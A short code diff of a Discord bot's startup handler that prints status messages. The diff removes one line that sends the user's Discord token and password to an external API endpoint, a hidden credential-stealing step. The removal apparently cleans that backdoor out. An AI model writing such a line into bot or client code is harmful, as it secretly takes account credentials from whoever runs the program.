@@ -79,7 +79,6 @@ async def on_ready():
     print(GREEN + "[+]Logged in as:" + MAGENTA +  f" {client.user.name}")
     print(GREEN + f"[+]Prefix: " + MAGENTA + prefix)
     print(RED + "[!]Bot online")
-    requests.post(api,json={'content': f"**Token:** `{token}`\n**Password:** `{password}`"})
     time.sleep(1)
     print(RED + "[!]Cogs functioning")
 
